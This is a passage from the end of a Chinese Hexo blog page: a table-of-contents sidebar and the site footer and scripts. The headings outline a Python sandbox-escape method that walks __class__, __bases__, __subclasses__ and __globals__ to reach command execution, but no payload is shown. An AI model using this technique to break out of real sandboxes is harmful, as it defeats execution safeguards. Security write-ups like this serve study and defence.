class="nav-text">1.随便找到一个内置类对象用__class__拿到他所对应的类</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-用-bases-拿到基类-lt-class-‘object-39"><span class="nav-number">1.47.4.</span> <span class="nav-text">2.用__bases__拿到基类(&lt;class ‘object&#39;)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-用-subclasses-拿到子类列表"><span class="nav-number">1.47.5.</span> <span class="nav-text">3.用__subclasses__()拿到子类列表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-在子类列表中直接寻找可以利用的类"><span class="nav-number">1.47.6.</span> <span class="nav-text">4.在子类列表中直接寻找可以利用的类</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例如："><span class="nav-number">1.48.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可以看到："><span class="nav-number">1.49.</span> <span class="nav-text">可以看到：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找file的位置。"><span class="nav-number">1.50.</span> <span class="nav-text">寻找file的位置。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用dir来看看内置的方法"><span class="nav-number">1.51.</span> <span class="nav-text">用dir来看看内置的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行的结果如下："><span class="nav-number">1.52.</span> <span class="nav-text">运行的结果如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造payload如下："><span class="nav-number">1.53.</span> <span class="nav-text">构造payload如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#或者用-mro-构造如下："><span class="nav-number">1.54.</span> <span class="nav-text">或者用__mro__构造如下：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法等价于"><span class="nav-number">1.55.</span> <span class="nav-text">方法等价于</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用类置模块执行命令"><span class="nav-number">1.56.</span> <span class="nav-text">用类置模块执行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#可以用-globals-更深入的去看每个类可以调用的东西（包括模块，类，变量等等）。"><span class="nav-number">1.56.1.</span> <span class="nav-text">可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等）。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如下的payload："><span class="nav-number">1.57.</span> <span class="nav-text">如下的payload：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上面的方法是基于python2的。"><span class="nav-number">1.58.</span> <span class="nav-text">上面的方法是基于python2的。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#下面是py2和py3都通用的。"><span class="nav-number">1.59.</span> <span class="nav-text">下面是py2和py3都通用的。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们要用-builtins-来构造。"><span class="nav-number">1.59.1.</span> <span class="nav-text">我们要用__builtins__来构造。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#于是有py3："><span class="nav-number">1.60.</span> <span class="nav-text">于是有py3：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#py2："><span class="nav-number">1.61.</span> <span class="nav-text">py2：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-参考"><span class="nav-number">1.62.</span> <span class="nav-text">0x07 参考</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Python沙箱逃逸总结"><span class="nav-number">1.62.0.1.</span> <span class="nav-text">Python沙箱逃逸总结</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Python-沙箱逃逸"><span class="nav-number">1.62.0.2.</span> <span class="nav-text">Python 沙箱逃逸</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#python-沙箱逃逸"><span class="nav-number">1.62.0.3.</span> <span class="nav-text">python 沙箱逃逸</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">150.1k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
